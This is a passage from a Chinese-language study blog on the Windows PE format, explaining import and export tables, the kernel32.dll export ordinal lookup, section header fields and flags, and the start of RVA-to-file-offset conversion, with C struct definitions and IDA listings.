<p>7.重复4-6直到遭遇INT最后一项0</p>
<p>到此貌似了解了整个库函数符号解析的过程,回忆整个过程</p>
<p>编译器和链接器不会解析动态库的符号,</p>
<p>在text节正文代码上call的是ds:[库函数名],实际上是call这个<strong>地址上存放的地址</strong>,</p>
<p>ds:[库函数名]是.idata区的IAT表,每个IAT条目四个字节,将来要存放一个实际的库函数地址</p>
<p>编译器和链接器会记录没有解析的外部符号,放到DataDirectory[1]指向的<code>_IMAGE_IMPORT_DESCRIPTOR</code>数组中,</p>
<p>每一个需要导入的库都在本数组中建立一个表项,每个表项记录要装载哪个库(Name),还有要装载这个库的哪些函数(指向<code>_IMAGE_IMPORT_BY_NAME</code>数组即INT表的指针).还有哪个地方需要解析这个库里的函数(指向.idata段IAT表基址的指针)</p>
<p>每个INT表表项都要记录,要装载哪个函数,该函数的Hint</p>
<p>但是但是,PE装载器是怎么从DLL库中找到函数地址的呢?</p>
</blockquote>
<blockquote>
<blockquote>
<p>符号解析可以分为三个阶段</p>
<p>1.编译时</p>
<p>编译器负责将本文件中的引用解析到本文件中的实现,比如</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	func();</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="comment">//do something...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>main前面这个func就是一个引用,它的作用是给编译器说,有这么一个func函数,但只是有,func具体干了啥,编译器不知道.</p>
<p>编译器会首先发现第一行的引用,然后在本文件中找实现,显然可以找到实现,于是就有了func的PC相对地址,再main中调用func时就可以</p>
<p>汇编成<code>call 相对地址</code>的格式</p>
<blockquote>
<p>这个引用是必须的,去掉之后会发生意想不到的运行时错误</p>
<p>比如</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// void func();</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">int</span> a=func();</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="comment">//do something...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样可以通过编译,但是显然func没有返回值.提前声明void func();再编译会直接编译报错.</p>
</blockquote>
<p>2.链接时</p>
<p>一个模块可能会引用其他模块中的符号,比如全局变量或者函数</p>
<p>比如下面这个程序</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">int</span> other;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">int</span> a=other;</span><br><span class="line">	func();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译器发现other是个外部符号,func虽然没有表明extern但是本模块中找不到实现.</p>
<p>而编译器只负责将一个一个孤立的模块编译,将他们链接起来不是编译器的事,</p>
<p>于是编译器就为other和func都生成一个符号链接表项,把这个皮球踢给链接器完成</p>
<p>链接器首先进行符号解析,它会遍历每个模块,每找到一个全局符号就看看符号链接表中有没有他的引用,有则这个引用就可以落地.全遍历一遍之后还有不能解析的引用则报链接错</p>
<p>符号解析完毕之后就是重定位,将多个参与链接的目标模块合并成一个大目标模块</p>
<p>3.运行时</p>
<p>这就是IAT或者说GOT,PLT发挥作用的时候</p>
</blockquote>
</blockquote>
<h6 id="DataDirectory-0-Export"><a href="#DataDirectory-0-Export" class="headerlink" title="DataDirectory[0]&#x3D;Export"></a>DataDirectory[0]&#x3D;Export</h6><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220714145105577.png" alt="image-20220714145105577"></p>
<p>类比DataDirectory[1]导入表,导入表的作用是将动态库中的函数导入</p>
<p>那么导出表就应该把本模块中的函数向外导出,提供给其他模块使用,也就是本模块作为动态库</p>
<p><code>notepad.exe</code>是一个引用程序,显然不是动态库,自然没有导出的函数,那么<code>DataDirectory[0]</code>就是个空记录</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220712142026145.png" alt="image-20220712142026145"></p>
<p>可以通过观察<code>kernel32.dll</code>动态库,了解<code>Export</code>表怎么干活</p>
<blockquote>
<p>notepad.exe和kernel32.dll都是直接从windowsXP虚拟机的C:&#x2F;Windows&#x2F;System32下面拽出来的</p>
</blockquote>
<blockquote>
<p>notepad.exe和kernel32.dll的整体对比</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220712145612859.png" alt="image-20220712145612859"></p>
</blockquote>
<p>导出表<code>ExportDir</code>至多有一个,但是导入表可以有多个</p>
<p>因为一个应用程序可能需要多个动态库支持,而一个动态库只需要一个导出表导出自身函数</p>
<p><strong>kernel32.dll</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PE头</span><br><span class="line">	NT头</span><br><span class="line">		可选头</span><br><span class="line">			数据目录表[0]=Export表</span><br><span class="line">				-&gt;AddressOfFunctions</span><br><span class="line">				-&gt;AddressOfNames</span><br><span class="line">				-&gt;AddressOfNameOrdinals</span><br></pre></td></tr></table></figure>



<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220714223418977.png" alt="image-20220714223418977"></p>
<p>两个表项,分别是相对虚拟地址0x22140h和十进制表示的大小27016</p>
<p>由于ImageBase为0x77e40000h,因此实际虚拟地址就是0x77e62140</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220714144520852.png" alt="image-20220714144520852"></p>
<p>如果使用ida就观察0x77e62140这个位置</p>
<p>如果使用010editor就观察0x21540这个位置</p>
<p>这个位置就是<code>IMAGE_EXPORT_DIRECTORY</code>结构体的起始地址,这个结构体是干啥的呢?</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span></span><br><span class="line">  DWORD Characteristics;</span><br><span class="line">  DWORD TimeDateStamp;<span class="comment">//该文件编译完成的事件</span></span><br><span class="line">  WORD MajorVersion;</span><br><span class="line">  WORD MinorVersion;</span><br><span class="line">  DWORD Name;<span class="comment">//库名</span></span><br><span class="line">  DWORD Base;</span><br><span class="line">  DWORD NumberOfFunctions;<span class="comment">//库函数的个数</span></span><br><span class="line">  DWORD NumberOfNames;<span class="comment">//有名字的库函数的个数</span></span><br><span class="line">  DWORD AddressOfFunctions;<span class="comment">//</span></span><br><span class="line">  DWORD AddressOfNames;<span class="comment">//函数名称数组地址</span></span><br><span class="line">  DWORD AddressOfNameOrdinals;<span class="comment">//名称顺序表地址</span></span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY,*PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure>

<p>NumberOfFunctions和NumberOfNames,在kernel32.dll中数量相同,都是928,也就是说导出了928个函数,每个函数都有名字</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220714152432702.png" alt="image-20220714152432702"></p>
<p>这就很奇怪了,</p>
<p><strong>一是为啥函数要有名字?</strong></p>
<p><strong>二是,为啥每个函数都有名字了还要记录一个名字数量和一个函数数量,两个不相同吗?</strong></p>
<p>在<strong>可执行目标文件exe</strong>中,确实不需要函数有名字,要调用函数,只需要call 函数地址.函数名字就是一个写源代码时的助记符</p>
<p>但是库文件不一样,库需要为别的exe文件或者库提供支持.</p>
<p>动态库在exe装载时才会映射进入进程虚拟地址空间,然后进行动态链接.</p>
<p>我们已经在自己的模块源代码中写了”MessageBox”这种动态库中的函数符号,显然静态解析解决不了这个符号.</p>
<p>那么动态链接的时候怎么解析这个事情呢?</p>
<blockquote>
<p><strong>我的想法是</strong>,在exe中保留需要调用的库函数的名字,在dll中导出库函数的名字,并且和地址挂钩.动态链接器在解析exe中动态库函数名字时,就像查字典一样,exe中看一眼,要解析MessageBox,再去dll中遍历所有[库函数名,地址]键值对,查到就把地址写到exe的相应位置.</p>
<p>但是如果库函数很多,库函数名很长,匹配库函数名还是字符串匹配,那么遍历库函数表的效率会很低.并且这样做完全没有必要</p>
<p>可以给每个函数编一个号,比如MessageBox编号1,MessageBoxW编号2,以此类推,这就好比建立了一个协议,exe需要一个一号函数,动态解析器就去dll库中索要1号函数,dll库和exe都知道1号函数是MessageBox.而动态链接器相当于中间信道,它没必要知道MessageBox-&gt;1-&gt;MessageBox这个过程</p>
</blockquote>
<p>而实际上人家是怎么解决这个问题的呢?</p>
<p>回顾notepad.exe<strong>导入表</strong>的情形,<code>_IMAGE_IMPORT_BY_NAME</code>有两个成员,</p>
<p>第一个Hint,就是函数编号.</p>
<p>第二个,Name,函数名</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220714152202138.png" alt="image-20220714152202138"></p>
<p>和它门当户对的ExportByName是啥样的呢?只记住了一个函数名</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220714152703198.png" alt="image-20220714152703198"></p>
<p>奇怪了,ExportByName比ImportByName少一个Hint成员,这是为啥呢?</p>
<p>观察一下notepad.exe的ImportByName[0]:</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220714152850743.png" alt="image-20220714152850743"></p>
<p>这里Hint是489,这不禁让人浮想联翩,这个数是怎么来的呢?</p>
<p>会不会是ExportByName数组的下标?回家看看吧</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220714152949332.png" alt="image-20220714152949332"></p>
<p>还真是,<code>ImportByName[0].Hint</code>就是<code>GlobalUnlock</code>函数在<code>ExportByName</code>中的下标</p>
<p>显然在notepad.exe这种应用程序中使用函数名Name或者函数下标Hint导入动态库的函数都可以达到链接目的</p>
<p>到此貌似就了解了动态链接干活的过程,然而还有两个问题没有解决,</p>
<p>1.为啥NumberOfNames和NumberOfFunctions值相同,但是要记两个</p>
<p>2._IMAGE_EXPORT_DIRECTORY的AddressOfNameOrdinals成员貌似还没有发挥作用</p>
<p>核心原理给出的动态链接器的工作过程:</p>
<p>1.动态链接器从exe的ImportByName[x]拿到函数名Name</p>
<p>2.动态链接器遍历dll的ExportByName[]数组,用Name匹配每一项的函数名</p>
<p>3.如果匹配到,记录此时在ExportByName中的下标i</p>
<p>4.用i去查dll的AddressOfNameOridinals指向的数组,用刚才得到的下标i作为下标查AddressOfNameOridinals数组,得到AddressOfNameOridinals[i]&#x3D;INDEX,这是下标</p>
<p>5.用新下标INDEX(AddressOfNameOridinals[i])去查AddressOfFunctions,得到AddressOfFunctions[INDEX]得到Name函数的相对虚拟地址</p>
<blockquote>
<p>如果按照之前认为的hint就是函数下标的方法,那么这个想象的过程应该是</p>
<p>1.动态链接器从exe的ImportByName[x]拿到函数名Name</p>
<p>2.动态链接器遍历dll的ExportByName[]数组,用Name匹配每一项的函数名</p>
<p>3.如果匹配到,记录此时在ExportByName中的下标i</p>
<p>4.用下标i去查AddressOfFunctions,得到AddressOfFunctions[i]得到Name函数的相对虚拟地址</p>
</blockquote>
<p>而实际的方法多查了一个AddressOfNameOridinals表,这是为啥呢?</p>
<p>还又得回到NumberOfFunction和NumberOfName,这俩值一定一样吗?</p>
<p>重新考虑动态库的导出函数一定要有名字吗?</p>
<p>如果exe能够根据ImportByName.hint找到该函数,完全可以不用名字</p>
<p>那么动态库导出的函数就可以有匿名函数.</p>
<p>这时匿名函数就不能使用ExportByName机制了,因为它根本没名字.</p>
<p>如果每个函数都有名字,那么显然AddressOfNameOrdinals,AddressOfFunctions,AddressOfNames都有相同数量的表项</p>
<p>如果有一个匿名函数,那么AddressOfNames就得少一项.</p>
<p>AddressOfFunctions数组啃腚记载了所有数组的地址,包括匿名的和有名的</p>
<p>AddressOfNameOrdinals从名字上看,名称序列,它实际完成了一个下标转换.<strong>一个有名字的函数,在所有函数中的下标是多少</strong></p>
<p>而AddressOfNames是记录,一个函数名对应的下标是多少</p>
<p>整个映射过程是这样的:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">函数名	-&gt;查AddressOfNames-&gt;函数在AddressOfNames中的下标</span><br><span class="line">		-&gt;查AddressOfNameOrdinals-&gt;函数在所有库函数中的下标</span><br><span class="line">		-&gt;查AddressOfFunctions-&gt;函数相对虚拟地址</span><br><span class="line"></span><br><span class="line">匿名函数在所有库函数中的下标-&gt;查AddressOfFunctions-&gt;函数相对虚拟地址</span><br></pre></td></tr></table></figure>

<p>那么AddressOfNameOrdinals的项数应该和AddressOfNames相同,有多少个具名函数,ordinal就得提供多少个映射服务</p>
<blockquote>
<p>用ida观察kernel32.dll的AddressOfOrdinals表,由于所有函数具名,因此AddressOfOrdinals实际上完成了一个$f(x)&#x3D;x$的映射,</p>
<p>第一个具名函数就是kernel32中所有函数的第一个函数</p>
<p>第n个具名函数就是kernel32中所有函数的第n个函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.text:77E63E68 ; Export Ordinals Table for KERNEL32.dll</span><br><span class="line">.text:77E63E68 ;</span><br><span class="line">.text:77E63E68 byte_77E63E68   db 2 dup(0), 1, 0, 2, 0, 3, 0, 4, 0, 5, 0, 6, 0, 7, 0</span><br><span class="line">.text:77E63E68                                         ; DATA XREF: .text:77E62164↑o</span><br><span class="line">.text:77E63E68                 db 8, 0, 9, 0, 0Ah, 0, 0Bh, 0, 0Ch, 0, 0Dh, 0, 0Eh, 0</span><br><span class="line">.text:77E63E68                 db 0Fh, 0, 10h, 0, 11h, 0, 12h, 0, 13h, 0, 14h, 0, 15h</span><br><span class="line">.text:77E63E68                 db 0, 16h, 0, 17h, 0, 18h, 0, 19h, 0, 1Ah, 0, 1Bh, 0, 1Ch</span><br><span class="line">.text:77E63E68                 db 0, 1Dh, 0, 1Eh, 0, 1Fh, 0, 20h, 0, 21h, 0, 22h, 0, 23h</span><br><span class="line">.text:77E63E68                 db 0, 24h, 0, 25h, 0, 26h, 0, 27h, 0, 28h, 0, 29h, 0, 2Ah</span><br><span class="line">.text:77E63E68                 db 0, 2Bh, 0, 2Ch, 0, 2Dh, 0, 2Eh, 0, 2Fh, 0, 30h, 0, 31h</span><br><span class="line">.text:77E63E68                 db 0, 32h, 0, 33h, 0, 34h, 0, 35h, 0, 36h, 0, 37h, 0, 38h</span><br></pre></td></tr></table></figure>

<p>显然对于一个所有函数都具名的动态库kernel32,AddressOfNameOrdinals是纯纯的five.</p>
<p>但是总是得照顾一些搞特殊的动态库</p>
</blockquote>
<blockquote>
<p>AddressOfFunctions又叫EAT,export address table</p>
</blockquote>
<h3 id="节区头表"><a href="#节区头表" class="headerlink" title="节区头表"></a>节区头表</h3><p>节区头表,或者叫做”节头表”,实际上是节区头结构体数组</p>
<p>数组的每个元素都是一个节区头</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> &#123;</span></span><br><span class="line">     BYTE Name[IMAGE_SIZEOF_SHORT_NAME];</span><br><span class="line">     <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">DWORD PhysicalAddress;</span><br><span class="line">DWORD VirtualSize;</span><br><span class="line">     &#125; Misc;</span><br><span class="line">     DWORD VirtualAddress;</span><br><span class="line">     DWORD SizeOfRawData;</span><br><span class="line">     DWORD PointerToRawData;</span><br><span class="line">     DWORD PointerToRelocations;</span><br><span class="line">     DWORD PointerToLinenumbers;</span><br><span class="line">     WORD NumberOfRelocations;</span><br><span class="line">     WORD NumberOfLinenumbers;</span><br><span class="line">     DWORD Characteristics;</span><br><span class="line">   &#125; IMAGE_SECTION_HEADER,*PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure>

<h4 id="Name-IMAGE-SIZEOF-SHORT-NAME"><a href="#Name-IMAGE-SIZEOF-SHORT-NAME" class="headerlink" title="Name[IMAGE_SIZEOF_SHORT_NAME]"></a>Name[IMAGE_SIZEOF_SHORT_NAME]</h4><p>节区名称,其中<code>#define IMAGE_SIZEOF_SHORT_NAME 8</code>,即名称最长不得超过8字节</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220711212317715.png" alt="image-20220711212317715"></p>
<p>010editor给出的注释是”可以不以0结尾”,这与我们平时使用的字符串以<code>&#39;\0&#39;</code>结尾不同</p>
<p>原因是Name无足轻重,机器不关心节叫啥,只关心节的排列顺序</p>
<h4 id="PhysicalAddress-VirtualSize"><a href="#PhysicalAddress-VirtualSize" class="headerlink" title="PhysicalAddress&amp;VirtualSize"></a>PhysicalAddress&amp;VirtualSize</h4><p>哥俩生异型啊,连体婴儿是吧</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">	DWORD PhysicalAddress;</span><br><span class="line">	DWORD VirtualSize;</span><br><span class="line">&#125; Misc;</span><br></pre></td></tr></table></figure>



<h5 id="VirtualAddress"><a href="#VirtualAddress" class="headerlink" title="VirtualAddress"></a>VirtualAddress</h5><p>节在进程加载进入虚拟地址空间之后的相对虚拟地址</p>
<h5 id="SizeOfRawData"><a href="#SizeOfRawData" class="headerlink" title="SizeOfRawData"></a>SizeOfRawData</h5><p>节大小</p>
<p>根据相对虚拟地址和节大小就可以确定节在虚存中的范围</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220714233554055.png" alt="image-20220714233554055"></p>
<p>在notepad.exe中VirtualAddress&#x3D;1000h,则绝对虚拟地址就是1001000,</p>
<p>大小是6E00h,则节的范围就是0x1001000h~0x1007E00h</p>
<p>这个范围中,最开始是.idata节,然后是.text节</p>
<h5 id="PointerToRawData"><a href="#PointerToRawData" class="headerlink" title="PointerToRawData"></a>PointerToRawData</h5><p>节在磁盘文件中的起始地址</p>
<h5 id="PointerToRelocations"><a href="#PointerToRelocations" class="headerlink" title="PointerToRelocations"></a>PointerToRelocations</h5><p>重定位使用,在exe中该值无用,在可重定位目标模块.</p>
<p>obj中该值指向IMAGE_RELOCATION 结构体,重定位要用</p>
<p>具体怎么重定位,需要学习核心原理第16章</p>
<h5 id="PointerToLinenumbers"><a href="#PointerToLinenumbers" class="headerlink" title="PointerToLinenumbers"></a>PointerToLinenumbers</h5><p>行号表指针,调试使用</p>
<h5 id="NumberOfRelocations"><a href="#NumberOfRelocations" class="headerlink" title="NumberOfRelocations"></a>NumberOfRelocations</h5><p>obj中该值作为下标,指向<strong>重定位</strong>表对应该节的表项</p>
<h5 id="Characteristics-1"><a href="#Characteristics-1" class="headerlink" title="Characteristics"></a>Characteristics</h5><p>枚举值,节属性,起保护作用,多个属性则按位或</p>
<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Meaning</th>
</tr>
</thead>
<tbody><tr>
<td align="left">0x00000000</td>
<td align="left">Reserved.</td>
</tr>
<tr>
<td align="left">0x00000001</td>
<td align="left">Reserved.</td>
</tr>
<tr>
<td align="left">0x00000002</td>
<td align="left">Reserved.</td>
</tr>
<tr>
<td align="left">0x00000004</td>
<td align="left">Reserved.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_SCN_TYPE_NO_PAD</strong>0x00000008</td>
<td align="left">The section should not be padded to the next boundary. This flag is obsolete and is replaced by IMAGE_SCN_ALIGN_1BYTES.</td>
</tr>
<tr>
<td align="left">0x00000010</td>
<td align="left">Reserved.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_SCN_CNT_CODE</strong>0x00000020</td>
<td align="left">The section contains executable code.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_SCN_CNT_INITIALIZED_DATA</strong>0x00000040</td>
<td align="left">The section contains initialized data.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_SCN_CNT_UNINITIALIZED_DATA</strong>0x00000080</td>
<td align="left">The section contains uninitialized data.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_SCN_LNK_OTHER</strong>0x00000100</td>
<td align="left">Reserved.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_SCN_LNK_INFO</strong>0x00000200</td>
<td align="left">The section contains comments or other information. This is valid only for object files.</td>
</tr>
<tr>
<td align="left">0x00000400</td>
<td align="left">Reserved.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_SCN_LNK_REMOVE</strong>0x00000800</td>
<td align="left">The section will not become part of the image. This is valid only for object files.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_SCN_LNK_COMDAT</strong>0x00001000</td>
<td align="left">The section contains COMDAT data. This is valid only for object files.</td>
</tr>
<tr>
<td align="left">0x00002000</td>
<td align="left">Reserved.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_SCN_NO_DEFER_SPEC_EXC</strong>0x00004000</td>
<td align="left">Reset speculative exceptions handling bits in the TLB entries for this section.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_SCN_GPREL</strong>0x00008000</td>
<td align="left">The section contains data referenced through the global pointer.</td>
</tr>
<tr>
<td align="left">0x00010000</td>
<td align="left">Reserved.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_SCN_MEM_PURGEABLE</strong>0x00020000</td>
<td align="left">Reserved.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_SCN_MEM_LOCKED</strong>0x00040000</td>
<td align="left">Reserved.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_SCN_MEM_PRELOAD</strong>0x00080000</td>
<td align="left">Reserved.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_SCN_ALIGN_1BYTES</strong>0x00100000</td>
<td align="left">Align data on a 1-byte boundary. This is valid only for object files.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_SCN_ALIGN_2BYTES</strong>0x00200000</td>
<td align="left">Align data on a 2-byte boundary. This is valid only for object files.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_SCN_ALIGN_4BYTES</strong>0x00300000</td>
<td align="left">Align data on a 4-byte boundary. This is valid only for object files.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_SCN_ALIGN_8BYTES</strong>0x00400000</td>
<td align="left">Align data on a 8-byte boundary. This is valid only for object files.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_SCN_ALIGN_16BYTES</strong>0x00500000</td>
<td align="left">Align data on a 16-byte boundary. This is valid only for object files.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_SCN_ALIGN_32BYTES</strong>0x00600000</td>
<td align="left">Align data on a 32-byte boundary. This is valid only for object files.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_SCN_ALIGN_64BYTES</strong>0x00700000</td>
<td align="left">Align data on a 64-byte boundary. This is valid only for object files.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_SCN_ALIGN_128BYTES</strong>0x00800000</td>
<td align="left">Align data on a 128-byte boundary. This is valid only for object files.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_SCN_ALIGN_256BYTES</strong>0x00900000</td>
<td align="left">Align data on a 256-byte boundary. This is valid only for object files.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_SCN_ALIGN_512BYTES</strong>0x00A00000</td>
<td align="left">Align data on a 512-byte boundary. This is valid only for object files.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_SCN_ALIGN_1024BYTES</strong>0x00B00000</td>
<td align="left">Align data on a 1024-byte boundary. This is valid only for object files.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_SCN_ALIGN_2048BYTES</strong>0x00C00000</td>
<td align="left">Align data on a 2048-byte boundary. This is valid only for object files.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_SCN_ALIGN_4096BYTES</strong>0x00D00000</td>
<td align="left">Align data on a 4096-byte boundary. This is valid only for object files.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_SCN_ALIGN_8192BYTES</strong>0x00E00000</td>
<td align="left">Align data on a 8192-byte boundary. This is valid only for object files.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_SCN_LNK_NRELOC_OVFL</strong>0x01000000</td>
<td align="left">The section contains extended relocations. The count of relocations for the section exceeds the 16 bits that is reserved for it in the section header. If the <strong>NumberOfRelocations</strong> field in the section header is 0xffff, the actual relocation count is stored in the <strong>VirtualAddress</strong> field of the first relocation. It is an error if IMAGE_SCN_LNK_NRELOC_OVFL is set and there are fewer than 0xffff relocations in the section.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_SCN_MEM_DISCARDABLE</strong>0x02000000</td>
<td align="left">The section can be discarded as needed.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_SCN_MEM_NOT_CACHED</strong>0x04000000</td>
<td align="left">The section cannot be cached.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_SCN_MEM_NOT_PAGED</strong>0x08000000</td>
<td align="left">The section cannot be paged.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_SCN_MEM_SHARED</strong>0x10000000</td>
<td align="left">The section can be shared in memory.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_SCN_MEM_EXECUTE</strong>0x20000000</td>
<td align="left">The section can be executed as code.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_SCN_MEM_READ</strong>0x40000000</td>
<td align="left">The section can be read.</td>
</tr>
<tr>
<td align="left"><strong>IMAGE_SCN_MEM_WRITE</strong>0x80000000</td>
<td align="left">The section can be written to.</td>
</tr>
</tbody></table>
<p>比如notepad.exe中的text节</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220714232136762.png" alt="image-20220714232136762"></p>
<p>其中开启了三个标志</p>
<p>节包含代码,节可执行,节可读</p>
<p>其他的都不可,比如节不可写</p>
<h2 id="RVA-to-RAW"><a href="#RVA-to-RAW" class="headerlink" title="RVA to RAW"></a>RVA to RAW</h2><p>这一部分010editor已经帮我们算好了</p>
<p>可执行文件要运行时,首先要装载进入虚拟内存.</p>
<p>这个映射过程不是简单的找一个<code>ImageBase</code>然后照搬磁盘中的文件到虚拟内存就完了</p>
<p>诚如是则文件中和内存中该文件应该一样大.</p>
<p>而实际上节区有各种对齐要求,因此虚拟内存中的文件映像往往更大</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220710144537819.png" alt="image-20220710144537819"></p>
<p>从<code>notepad.exe</code>的例子上可以看出,PE头部分确实是找一个<code>ImageBase</code>然后原封不动照搬的</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220710145018095.png" alt="image-20220710145018095"></p>
<p>文件在磁盘中存放时,基地址是0,搬到内存中假设映像基地址是<code>ImageBase=0x1000000</code></p>
<p>可想而知,NT头如果在文件中的偏移量是<code>0xE0</code>则映射到进程地址空间中的虚拟地址就是<code>ImageBase+0xE0=0x10000E0</code></p>
<p>可是后来的节区就得根据对齐要求来了</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220710145058360.png" alt="image-20220710145058360"></p>
<p>这个转化关系是什么呢?</p>
<p>权位指南上给出的算法是</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220710155642134.png" alt="image-20220710155642134"></p>
<p>我看了好半天没看明白,</p>
<p>原因一是VirtualAddress和书上先前给出的符号意义不同造成了混淆,</p>
<p>二是对符号的定义没有完全理解,</p>
<p>下面复习一下这几个符号的意义并推导这个计算公式</p>
<p>要利用到<code>_IMAGE_SECTION_HEADER</code>头中的<code>PointerToRawData,VirtualAddress,SizeOfRawData</code>这几个值</p>
<p>复习一下这几个值的含义</p>
<p><code>PointerToRawData</code>:磁盘文件中节区的起始位置,由于文件的起始地址为0,那么PointerToRawData也就是节区基地址相对于0的偏移量,也就是RAW</p>
